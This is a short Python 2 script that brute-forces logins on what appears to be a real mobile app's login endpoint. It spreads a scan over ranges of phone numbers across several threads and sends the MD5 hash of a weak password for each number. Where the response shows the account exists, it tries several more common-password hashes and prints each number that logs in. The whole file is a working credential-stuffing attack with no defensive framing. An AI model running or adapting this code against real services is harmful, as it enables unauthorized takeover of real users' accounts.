#coding:utf-8

import requests
import json
import thread

url = "http://monk.uboxol.com/user/login?clientversion=5.7.2&machine_type=Android&os=4.3&channel_id=1&device_no=14566349&imei=574586975673300&device_id=2&u=&wake_id=0&net_type=1&carrier_type=0&s=0&type=ssl"
r = requests.session()
r.headers['User-Agent'] = "Android"
r.headers['Content-Type'] = "application/x-www-form-urlencoded"

def login(phone,passwd):
    data = "phone="+phone+"&passwd="+passwd
    res = r.post(url,data=data)
    js = json.loads(res.content)
    if js[u'head'][u'code'] == 20001:
        print "Success:",i,passwd
    elif js[u'head'][u'code'] != 40007:
        print js[u'head'][u'code'],js[u'head'][u'message']
    return js[u'head'][u'code']

def run(start, end):
    for i in range(start,end):
        code = login(str(i),"e10adc3949ba59abbe56e057f20f883e")
        if code == 40009:
            print "Target:",i
            login(str(i),"25d55ad283aa400af464c76d713c07ad")
            login(str(i),"25f9e794323b453885f5181f1b624d0b")
            login(str(i),"96e79218965eb72c92a549dd5a330112")
            login(str(i),"4297f44b13955235245b2497399d7a93")
            login(str(i),"670b14728ad9902aecba32e22fa4f6bd")
            login(str(i),"c8837b23ff8aaa8a2dde915473ce0991")
        if i%100 == 0:
            print "Process：",i
    thread.exit_thread()

if __name__ == '__main__':
    thread.start_new_thread(run,(17828703400,17828704000))
    thread.start_new_thread(run,(17828704000,17828705000))
    thread.start_new_thread(run,(17828705000,17828706000))
    thread.start_new_thread(run,(17828706000,17828707000))
    thread.start_new_thread(run,(17828707000,17828708000))
    thread.start_new_thread(run,(17828708000,17828709000))
    thread.start_new_thread(run,(17828709000,17828710000))
    thread.start_new_thread(run,(17828710000,17828711000))
    
